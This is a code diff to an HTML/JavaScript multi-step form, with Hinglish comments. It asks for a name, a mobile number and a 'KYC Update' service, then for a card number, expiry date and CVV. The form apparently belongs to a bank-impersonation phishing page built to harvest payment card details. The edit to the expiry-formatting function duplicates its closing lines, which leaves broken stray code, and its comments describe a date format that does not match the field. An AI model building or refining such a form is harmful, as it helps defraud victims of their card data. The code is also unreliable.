@@ -143,7 +143,7 @@ input:focus, select:focus {
      <!-- Step 1 -->
     <div id="step1" class="form-step active">
       <input type="text" id="fullname" placeholder="Full Name" required>
-      <input type="text" id="mobile" placeholder="Mobile Number" required>
+      <input type="tel" id="mobile" placeholder="Mobile Number" required>
       <select id="service" required>
         <option value="">Select Service</option>
         <option value="KYC Update">KYC Update</option>
@@ -166,9 +166,9 @@ input:focus, select:focus {
 
     <!-- Step 3 -->
     <div id="step3" class="form-step">
-      <input type="text" id="cardnumber" placeholder="Card Number" required>
+      <input type="number" id="cardnumber" placeholder="Card Number" required>
       <input type="text" id="expiry" placeholder="Expiry Date (MM/YY)" maxlength="5" required oninput="formatExpiry(this)">
-      <input type="text" id="cvv" placeholder="CVV" maxlength="3" required>
+      <input type="number" id="cvv" placeholder="CVV" maxlength="3" required>
       <button class="button" onclick="showVerification('step4')">Next</button>
     </div>
 
@@ -257,12 +257,16 @@ input:focus, select:focus {
   let value = input.value.replace(/[^0-9]/g, ''); // Sirf numbers allow karo
   
   if (value.length > 2 && value.length <= 4) {
-    // Jaise hi DD complete hoga, ek slash add hoga
+    // Jaise hi DD complete hoga, turant ek slash add hoga
     value = value.slice(0, 2) + '/' + value.slice(2);
   } else if (value.length > 4) {
     // Jaise hi MM complete hoga, doosra slash add hoga
     value = value.slice(0, 2) + '/' + value.slice(2, 4) + '/' + value.slice(4, 8);
   }
+
+  input.value = value; // Final formatted value
+}
+
 
   input.value = value; // Formatted value set karo
 }
